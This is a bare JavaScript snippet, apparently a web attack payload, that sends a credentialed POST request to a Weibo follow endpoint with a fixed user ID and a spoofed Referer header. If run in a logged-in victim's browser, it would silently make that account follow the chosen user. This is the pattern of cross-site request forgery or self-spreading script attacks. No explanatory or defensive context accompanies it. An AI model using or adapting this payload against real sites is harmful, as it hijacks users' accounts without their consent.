let xml = new XMLHttpRequest();
xml.withCredentials = true;
xml.open('post','http://s.weibo.com/ajax/user/follow?__rnd=1505283594150');
xml.setRequestHeader("Referer","http://s.weibo.com");
xml.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xml.send('uid=5124124864&type=followed&wforce=0&_t=0');


